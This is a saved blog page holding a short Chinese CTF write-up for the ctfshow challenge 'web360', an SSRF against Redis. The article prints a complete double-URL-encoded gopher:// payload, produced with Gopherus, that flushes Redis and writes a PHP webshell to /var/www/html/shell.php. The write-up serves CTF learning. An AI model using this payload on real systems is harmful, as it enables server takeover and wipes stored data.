@@ -1,0 +1,287 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>web360-ssrf-redis | Lengkur</title><meta name="author" content="Lengkur"><meta name="copyright" content="Lengkur"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="1.提示redis数据库，用gopherus来帮我们生成请求 1gopherus --exploit redis   2.因为要经过两个服务器，所以得到的请求还要再url编码一次，最终payload 1url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web360-ssrf-redis">
+<meta property="og:url" content="http://lengkur.github.io/2026/01/24/wp/ctfshow/web360-ssrf-redis/index.html">
+<meta property="og:site_name" content="Lengkur">
+<meta property="og:description" content="1.提示redis数据库，用gopherus来帮我们生成请求 1gopherus --exploit redis   2.因为要经过两个服务器，所以得到的请求还要再url编码一次，最终payload 1url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://lengkur.github.io/img/stargirl.jpg">
+<meta property="article:published_time" content="2026-01-24T06:52:37.000Z">
+<meta property="article:modified_time" content="2026-01-24T07:28:35.234Z">
+<meta property="article:author" content="Lengkur">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://lengkur.github.io/img/stargirl.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "web360-ssrf-redis",
+  "url": "http://lengkur.github.io/2026/01/24/wp/ctfshow/web360-ssrf-redis/",
+  "image": "http://lengkur.github.io/img/stargirl.jpg",
+  "datePublished": "2026-01-24T06:52:37.000Z",
+  "dateModified": "2026-01-24T07:28:35.234Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Lengkur",
+      "url": "http://lengkur.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/lengkur.png"><link rel="canonical" href="http://lengkur.github.io/2026/01/24/wp/ctfshow/web360-ssrf-redis/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'web360-ssrf-redis',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/imgloaded.css"><link rel="stylesheet" href="/css/meteors.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.8.0/styles/atom-one-dark.min.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box" onclick="document.getElementById('loading-box').style.display='none'"><style>#loading-box {
+  position: fixed;
+  z-index: 1000;
+  width: 100vw;
+  height: 100vh;
+  background: #222;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  transition: opacity 0.5s; /* 增加消失时的淡出过渡 */
+}
+.loader {
+  position: relative;
+  width: 150px;
+  height: 150px;
+  background: transparent;
+  border-radius: 50%;
+  border: 2px solid transparent;
+  border-top-color: #00ffaa;
+  animation: spin 1.5s linear infinite;
+}
+.loader:before {
+  content: "";
+  position: absolute;
+  top: 5px;
+  left: 5px;
+  right: 5px;
+  bottom: 5px;
+  border-radius: 50%;
+  border: 2px solid transparent;
+  border-top-color: #00aaff;
+  animation: spin 3s linear infinite;
+}
+.loader:after {
+  content: "";
+  position: absolute;
+  top: 15px;
+  left: 15px;
+  right: 15px;
+  bottom: 15px;
+  border-radius: 50%;
+  border: 2px solid transparent;
+  border-top-color: #ff00aa;
+  animation: spin 1.5s linear infinite;
+}
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+[data-theme='light'] #loading-box {
+  background: #fff;
+}
+</style><div class="loader"></div><script>(function(){
+  const loadingBox = document.getElementById('loading-box');
+  
+  const removeLoading = () => {
+    if (!loadingBox) return;
+    loadingBox.style.opacity = '0';
+    setTimeout(() => {
+      loadingBox.style.display = 'none';
+    }, 500); // 等待0.5s过渡动画结束后彻底隐藏
+  }
+
+  // 1. 监听网页加载完成事件
+  window.addEventListener('load', removeLoading);
+  
+  // 2. 也是为了PJAX适配
+  document.addEventListener('pjax:complete', removeLoading);
+
+  // 3. 兜底机制：万一网络太卡，5秒后强制进入，防止一直卡死
+  setTimeout(removeLoading, 5000);
+})()</script></div><div class="bg-animation" id="web_bg" style="background-color: #000000;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/lengkur.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">70</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> WEB学习经历</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/notes/"><i class="fa-fw fas fa-book"></i><span> 笔记</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-pencil-alt"></i><span> Write Up</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/wp/"><i class="fa-fw fas fa-list-ul"></i><span> 全部文章</span></a></li><li><a class="site-page child" href="/categories/wp/ctfshow/"><i class="fa-fw fas fa-flag"></i><span> ctfshow</span></a></li><li><a class="site-page child" href="/categories/wp/NSSCTF-WEB/"><i class="fa-fw fas fa-skull"></i><span> NSSCTF</span></a></li><li><a class="site-page child" href="/categories/wp/BUUCTF/"><i class="fa-fw fas fa-biohazard"></i><span> BUUCTF</span></a></li><li><a class="site-page child" href="/categories/wp/%E4%B8%89%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/"><i class="fa-fw fas fa-chess-rook"></i><span> CISCN</span></a></li><li><a class="site-page child" href="/categories/wp/DASCTF/"><i class="fa-fw fas fa-shield-alt"></i><span> DASCTF</span></a></li><li><a class="site-page child" href="/categories/wp/furryctf/"><i class="fa-fw fas fa-paw"></i><span> furryctf</span></a></li><li><a class="site-page child" href="/categories/wp/polarctf/"><i class="fa-fw fas fa-snowflake"></i><span> polarctf</span></a></li><li><a class="site-page child" href="/categories/wp/NSS-%E5%B7%A5%E5%9D%8Aweb%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"><i class="fa-fw fas fa-tools"></i><span> NSS工坊</span></a></li><li><a class="site-page child" href="/categories/wp/NSS%E6%98%9F%E8%BE%B0%E5%A4%A7%E6%B5%B7/"><i class="fa-fw fas fa-rocket"></i><span> NSS星辰大海</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-id-badge"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/stargirl.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Lengkur</span></a><a class="nav-page-title" href="/"><span class="site-name">web360-ssrf-redis</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> WEB学习经历</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/notes/"><i class="fa-fw fas fa-book"></i><span> 笔记</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-pencil-alt"></i><span> Write Up</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/wp/"><i class="fa-fw fas fa-list-ul"></i><span> 全部文章</span></a></li><li><a class="site-page child" href="/categories/wp/ctfshow/"><i class="fa-fw fas fa-flag"></i><span> ctfshow</span></a></li><li><a class="site-page child" href="/categories/wp/NSSCTF-WEB/"><i class="fa-fw fas fa-skull"></i><span> NSSCTF</span></a></li><li><a class="site-page child" href="/categories/wp/BUUCTF/"><i class="fa-fw fas fa-biohazard"></i><span> BUUCTF</span></a></li><li><a class="site-page child" href="/categories/wp/%E4%B8%89%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF/"><i class="fa-fw fas fa-chess-rook"></i><span> CISCN</span></a></li><li><a class="site-page child" href="/categories/wp/DASCTF/"><i class="fa-fw fas fa-shield-alt"></i><span> DASCTF</span></a></li><li><a class="site-page child" href="/categories/wp/furryctf/"><i class="fa-fw fas fa-paw"></i><span> furryctf</span></a></li><li><a class="site-page child" href="/categories/wp/polarctf/"><i class="fa-fw fas fa-snowflake"></i><span> polarctf</span></a></li><li><a class="site-page child" href="/categories/wp/NSS-%E5%B7%A5%E5%9D%8Aweb%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"><i class="fa-fw fas fa-tools"></i><span> NSS工坊</span></a></li><li><a class="site-page child" href="/categories/wp/NSS%E6%98%9F%E8%BE%B0%E5%A4%A7%E6%B5%B7/"><i class="fa-fw fas fa-rocket"></i><span> NSS星辰大海</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-id-badge"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">web360-ssrf-redis</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-24T06:52:37.000Z" title="发表于 2026-01-24 14:52:37">2026-01-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-24T07:28:35.234Z" title="更新于 2026-01-24 15:28:35">2026-01-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/wp/">wp</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/wp/ctfshow/">ctfshow</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">180</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>1分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/mdimg/image-20260113171316802.png" alt="image-20260113171316802"></p>
+<p>1.提示redis数据库，用gopherus来帮我们生成请求</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">gopherus --exploit redis<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/image-20260113171431226.png" alt="image-20260113171431226"></p>
+<p>2.因为要经过两个服务器，所以得到的请求还要再url编码一次，最终payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">url=gopher:<span class="hljs-comment">//127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252430%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2527cat%2520%2Ff%252A%2527%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></code></pre></td></tr></table></figure>
+
+<p>3.这题要响应很久，但最后木马能写进去</p>
+<p>访问就行</p>
+<p><img src="/mdimg/image-20260113171735919.png" alt="image-20260113171735919"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://lengkur.github.io">Lengkur</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://lengkur.github.io/2026/01/24/wp/ctfshow/web360-ssrf-redis/">http://lengkur.github.io/2026/01/24/wp/ctfshow/web360-ssrf-redis/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://lengkur.github.io" target="_blank">Lengkur</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/stargirl.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/01/24/wp/ctfshow/web359-ssrf-mysql/" title="web359-ssrf-mysql"><img class="cover" src="/img/stargirl.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">web359-ssrf-mysql</div></div><div class="info-2"><div class="info-item-1"> 提示：打无密码的mysql 1.查看源码可以知道PO...</div></div></div></a><a class="pagination-related" href="/2026/01/24/wp/ctfshow/web369-ssti-%E4%B8%8B%E5%88%92%E7%BA%BF%E7%BB%95%E8%BF%87-%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87-%5B%5D%E7%BB%95%E8%BF%87-%7B%7B%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4request/" title="web369-ssti-下划线绕过-引号绕过-[]绕过-{{绕过-过滤request"><img class="cover" src="/img/stargirl.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">web369-ssti-下划线绕过-引号绕过-[]绕过-{{绕过-过滤request</div></div><div class="info-2"><div class="info-item-1"> ![image-20260115110428373]...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/lengkur.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Lengkur</div><div class="author-info-description">Web Security / CTF Player / Bug Hunter</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">70</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lengkur"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/lengkur" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:guo374655@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Everything is vulnerable</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/wp/ctfshow/web330-%E5%AD%98%E5%82%A8%E5%9E%8BXSS-GET-%E9%92%93%E9%B1%BC/" title="web330-存储型XSS-GET-钓鱼"><img src="/img/stargirl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="web330-存储型XSS-GET-钓鱼"/></a><div class="content"><a class="title" href="/2026/01/24/wp/ctfshow/web330-%E5%AD%98%E5%82%A8%E5%9E%8BXSS-GET-%E9%92%93%E9%B1%BC/" title="web330-存储型XSS-GET-钓鱼">web330-存储型XSS-GET-钓鱼</a><time datetime="2026-01-24T06:52:37.000Z" title="发表于 2026-01-24 14:52:37">2026-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/wp/NSSCTF%20WEB/%5BDe1ctf%202019%5DSSRF%20Me-Flask/" title="[De1ctf 2019]SSRF Me-Flask"><img src="/img/catgirl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[De1ctf 2019]SSRF Me-Flask"/></a><div class="content"><a class="title" href="/2026/01/24/wp/NSSCTF%20WEB/%5BDe1ctf%202019%5DSSRF%20Me-Flask/" title="[De1ctf 2019]SSRF Me-Flask">[De1ctf 2019]SSRF Me-Flask</a><time datetime="2026-01-24T06:52:37.000Z" title="发表于 2026-01-24 14:52:37">2026-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/wp/furryctf/DeepSleep-py2%E7%9A%84input-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/" title="DeepSleep-py2的input-双写绕过"><img src="/img/Arch.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DeepSleep-py2的input-双写绕过"/></a><div class="content"><a class="title" href="/2026/01/24/wp/furryctf/DeepSleep-py2%E7%9A%84input-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/" title="DeepSleep-py2的input-双写绕过">DeepSleep-py2的input-双写绕过</a><time datetime="2026-01-24T06:52:37.000Z" title="发表于 2026-01-24 14:52:37">2026-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/wp/ctfshow/web171-SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88/" title="web171-SQL注入-联合"><img src="/img/stargirl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="web171-SQL注入-联合"/></a><div class="content"><a class="title" href="/2026/01/24/wp/ctfshow/web171-SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88/" title="web171-SQL注入-联合">web171-SQL注入-联合</a><time datetime="2026-01-24T06:52:37.000Z" title="发表于 2026-01-24 14:52:37">2026-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/24/wp/ctfshow/web371-ssti-print%E8%BF%87%E6%BB%A4-%E4%B8%8B%E5%88%92%E7%BA%BF-%E5%BC%95%E5%8F%B7-%E6%95%B0%E5%AD%97/" title="web371-ssti-print过滤-下划线-引号-数字"><img src="/img/stargirl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="web371-ssti-print过滤-下划线-引号-数字"/></a><div class="content"><a class="title" href="/2026/01/24/wp/ctfshow/web371-ssti-print%E8%BF%87%E6%BB%A4-%E4%B8%8B%E5%88%92%E7%BA%BF-%E5%BC%95%E5%8F%B7-%E6%95%B0%E5%AD%97/" title="web371-ssti-print过滤-下划线-引号-数字">web371-ssti-print过滤-下划线-引号-数字</a><time datetime="2026-01-24T06:52:37.000Z" title="发表于 2026-01-24 14:52:37">2026-01-24</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Lengkur</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4-b1"></script><script src="/js/main.js?v=5.5.4-b1"></script><div class="js-pjax"></div><link rel="stylesheet" href="/js/imgloaded.js"><link rel="stylesheet" href="/js/universe.js"><script src="/js/universe.js"></script><script id="canvas_nest" defer="defer" color="100,100,100" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-show-text.min.js" data-mobile="false" data-text="SQL,Javascript,Flask,HTTP,XSS,SSRF,CSRF,SSTI,Struct2,文件上传,文件包含,信息搜集,PHP,反序列化" data-fontsize="20px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/ctfshow/web185-sql-布尔盲注-引号过滤-数字过滤-=过滤/" alt=""><img width="48" height="48" src="/img/stargirl.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/ctfshow/web185-sql-布尔盲注-引号过滤-数字过滤-=过滤/" alt="">web185-sql-布尔盲注-引号过滤-数字过滤-=过滤</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/ctfshow/web185-sql-布尔盲注-引号过滤-数字过滤-=过滤/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/ctfshow/web371-ssti-print过滤-下划线-引号-数字/" alt=""><img width="48" height="48" src="/img/stargirl.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/ctfshow/web371-ssti-print过滤-下划线-引号-数字/" alt="">web371-ssti-print过滤-下划线-引号-数字</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/ctfshow/web371-ssti-print过滤-下划线-引号-数字/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/三届长城杯/AI_WAF/" alt=""><img width="48" height="48" src="/img/Arch.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/三届长城杯/AI_WAF/" alt="">AI_WAF</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/三届长城杯/AI_WAF/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: 